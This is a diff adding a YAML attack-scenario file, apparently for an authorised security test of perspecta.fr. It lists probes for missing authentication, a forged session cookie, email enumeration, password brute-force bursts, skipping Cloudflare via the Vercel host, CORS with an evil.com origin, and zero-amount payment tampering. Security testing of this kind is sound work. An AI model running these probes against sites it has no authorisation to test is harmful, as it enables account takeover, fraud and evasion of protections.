@@ -1,0 +1,119 @@
+target:
+  base_url: "https://www.perspecta.fr"
+  allowlist:
+    - "perspecta.fr"
+    - "www.perspecta.fr"
+
+steps:
+
+  # ── P0 : Endpoint sans auth ──────────────────────
+  - id: "ai-score-unauth"
+    method: GET
+    path: "/api/dashboard/ai-score"
+    variants:
+      - name: "no-auth"
+      - name: "fake-cookie"
+        headers:
+          Cookie: "next-auth.session-token=fakefakefake"
+
+  # ── P0 : Oracle email ────────────────────────────
+  - id: "email-oracle-login"
+    method: POST
+    path: "/api/auth/login"
+    headers:
+      Content-Type: "application/json"
+    variants:
+      - name: "existing-email"
+        body_override:
+          email: "${API_TOKEN}"
+          password: "wrongpassword123"
+      - name: "nonexistent-email"
+        body_override:
+          email: "zzznotexist99@nowhere.com"
+          password: "wrongpassword123"
+
+  - id: "email-oracle-forgot"
+    method: POST
+    path: "/api/auth/forgot-password"
+    headers:
+      Content-Type: "application/json"
+    variants:
+      - name: "existing-email"
+        body_override:
+          email: "${API_TOKEN}"
+      - name: "nonexistent-email"
+        body_override:
+          email: "zzznotexist99@nowhere.com"
+
+  # ── P0 : Crash formations ────────────────────────
+  - id: "formations-crash"
+    method: GET
+    path: "/api/formations"
+    variants:
+      - name: "no-auth"
+      - name: "with-params"
+        query: { "id": "1", "format": "json" }
+
+  # ── P1 : Brute force login ───────────────────────
+  - id: "brute-force"
+    method: POST
+    path: "/api/auth/callback/credentials"
+    headers:
+      Content-Type: "application/json"
+    variants:
+      - name: "attempt-1"
+        body_override:
+          email: "${API_TOKEN}"
+          password: "Password1!"
+      - name: "attempt-2"
+        body_override:
+          email: "${API_TOKEN}"
+          password: "Admin123!"
+      - name: "attempt-3"
+        burst_count: 20
+        body_override:
+          email: "${API_TOKEN}"
+          password: "Test1234!"
+
+  # ── P1 : Bypass Cloudflare via Vercel direct ─────
+  - id: "vercel-bypass"
+    method: GET
+    path: "/api/dashboard/ai-score"
+    headers:
+      Host: "perspecta-peach.vercel.app"
+    variants:
+      - name: "direct-vercel"
+
+  # ── P1 : CORS abuse ──────────────────────────────
+  - id: "cors-abuse"
+    method: GET
+    path: "/api/dashboard/ai-score"
+    headers:
+      Origin: "https://evil.com"
+    variants:
+      - name: "cross-origin"
+
+  # ── P1 : Payment probe ───────────────────────────
+  - id: "payment-probe"
+    method: POST
+    path: "/api/payment/checkout"
+    headers:
+      Content-Type: "application/json"
+    variants:
+      - name: "no-auth"
+        body_override:
+          plan: "pro"
+          amount: 0
+      - name: "free-plan"
+        body_override:
+          plan: "enterprise"
+          amount: 0
+          discount: 100
+
+  # ── P2 : Rate limit auth ─────────────────────────
+  - id: "rate-limit-auth"
+    method: POST
+    path: "/api/auth/callback/credentials"
+    variants:
+      - name: "burst"
+        burst_count: 30
